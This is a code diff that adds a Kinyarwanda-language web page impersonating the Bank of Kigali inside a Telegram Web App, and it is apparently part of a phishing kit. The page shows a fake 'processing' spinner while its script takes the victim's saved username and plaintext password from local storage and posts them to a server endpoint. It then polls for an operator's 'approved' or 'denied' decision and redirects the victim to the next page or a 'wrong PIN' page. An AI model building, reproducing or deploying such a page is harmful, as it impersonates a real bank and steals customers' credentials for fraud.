@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="rw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank of Kigali - Birimo Gutunganywa</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --bk-blue: #002b49;
+            --bk-blue-gradient: linear-gradient(180deg, #003f6b 0%, #002b49 100%);
+            --bg-dark: #0f172a;
+            --card-bg: #ffffff;
+            --text-dark: #0f172a;
+            --text-muted: #64748b;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .loading-card {
+            background: var(--card-bg);
+            width: 88%;
+            max-width: 380px;
+            padding: 45px 24px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .loader-circle {
+            width: 110px;
+            height: 110px;
+            background: var(--bk-blue-gradient);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 18px rgba(0, 43, 73, 0.3);
+        }
+
+        .loader-circle::after {
+            content: '';
+            width: 82px;
+            height: 82px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            color: var(--bk-blue);
+            font-size: 24px;
+            margin: 0 0 10px;
+            font-weight: 800;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Birimo gutunganywa...</h2>
+    <p id="sub-text">Tegereza gato kugenzura...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const username = localStorage.getItem("username") || "";
+    const password = localStorage.getItem("lastPassword") || "";
+
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password, country: "RW" })
+        });
+    } catch (err) {
+        console.error("❌ Ikosa ryo kohereza:", err);
+    }
+
+    setTimeout(() => {
+        mainText.textContent = "Tegereza gato...";
+        subText.textContent = "Biratwara amasegonda make cyane";
+    }, 3000);
+
+    async function checkApproval() {
+        if (!username) return;
+
+        try {
+            const res = await fetch(`/api/check-status?username=${encodeURIComponent(username)}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "Byemejwe!";
+                subText.textContent = "Uricibwa inzira igana ahataha...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "Byanzwe!";
+                subText.textContent = "Ijambo ry'ibanga cyangwa izina si byo.";
+
+                setTimeout(() => {
+                    window.location.href = "/page6?error=wrongpin";
+                }, 2000);
+            }
+
+        } catch (err) {
+            console.error("❌ Ikosa ryo kugenzura:", err);
+        }
+    }
+
+    setInterval(checkApproval, 2000);
+});
+</script>
+
+</body>
+</html>
